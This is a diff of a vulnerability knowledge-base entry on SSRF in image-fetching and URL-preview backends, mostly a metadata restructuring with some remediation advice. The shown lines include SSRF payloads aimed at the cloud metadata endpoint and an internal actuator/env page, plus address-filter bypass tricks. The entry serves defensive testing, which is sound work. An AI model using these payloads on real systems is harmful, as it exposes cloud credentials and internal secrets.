@@ -1,18 +1,38 @@
 ﻿---
-title: SSRF (image fetching / callback validation / promotional-link checks) against internal networks and cloud metadata
-cve: None (implementation flaw)
-severity: high
+id: "ssrf-to-internal"
+title: "SSRF (image fetching / callback validation / promotional-link checks) against internal networks and cloud metadata"
+kind: "implementation"
+cve: null
+related-cves: null
+cve-note: "None (implementation flaw)"
+severity: "high"
 cvss: 8.2
-product: Custom backends (image fetching, URL previews, payment-callback validation)
-versions: Any
-ports: 80, 443
-keywords: ssrf, internal network, metadata, 169.254.169.254, redis, gopher
-entry: url=http://169.254.169.254/latest/meta-data/
+severity-basis: "cvss"
+severity-note: null
+product: "Custom backends (image fetching, URL previews, payment-callback validation)"
+versions: "Any"
+ports: "80, 443"
+keywords: "ssrf, internal network, metadata, 169.254.169.254, redis, gopher"
+entry: "url=http://169.254.169.254/latest/meta-data/"
 verified: false
-sources: Compiled from public sources (implementation flaws; no CVE)
+verified-on: null
+verification-evidence: null
+source-url: null
+vendor-advisory: null
+cwe: null
+patch-date: null
+sources: "Compiled from public sources (implementation flaws; no CVE)"
+kev: null
+kev-date: null
+kev-source: null
+epss: null
+epss-percentile: null
+epss-date: null
+epss-source: null
+enrichment-updated: null
 ---
 
-## Fingerprints
+## Fingerprinting
 
 ```
 /api/upload/fetch?url=       /api/common/preview?url=
@@ -47,7 +67,9 @@ curl -s 'https://target/api/upload/fetch?url=http://10.0.0.5:8080/actuator/env'
 4. Restriction bypasses: `http://127.0.0.1` → `http://[::1]`, `0.0.0.0`, `2130706433`, DNS rebinding.
 5. Evidence: one returned-content sample (redacted) + timestamp; retain only DNS records for targets without outbound connectivity.
 
-## Remediation and Mitigation (Hardening)
+## Remediation and Mitigation
+
+### Remediation and Mitigation (Hardening)
 
 - URL allowlist (domain + port); block internal ranges and link-local addresses; validate resolved IPs rather than only strings.
 - Disable redirect following; route outbound traffic through a common egress proxy; enable IMDSv2 for metadata services.
